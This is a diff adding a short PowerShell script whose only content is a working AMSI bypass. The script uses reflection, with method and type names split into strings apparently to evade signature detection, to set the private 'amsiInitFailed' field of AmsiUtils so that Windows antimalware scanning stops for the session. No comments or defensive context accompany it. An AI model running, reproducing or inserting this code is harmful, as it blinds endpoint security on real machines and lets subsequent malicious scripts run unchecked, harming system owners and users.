@@ -1,0 +1,26 @@
+function Set-Value {
+    param(
+        [Parameter(Mandatory = $true)]
+        [Type]$Type,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Name,
+
+        [Parameter(Mandatory = $true)]
+        [object]$Value
+    )
+
+    $method = "GetField";
+    $setter = "SetValue";
+
+    $field = $Type.$method($Name,"NonPublic,Static");
+    $field.$setter($null,$Value);
+}
+
+if($PSVersionTable.PSVersion.Major -gt 2) {
+    $Assembly = "Assembly";
+    $method = "GetType";
+    $type = [Ref].$Assembly.$method("System.Management.Automation.AmsiUtils");
+    $name = "amsiInitFailed";
+    Set-Value $type $name $true;
+}
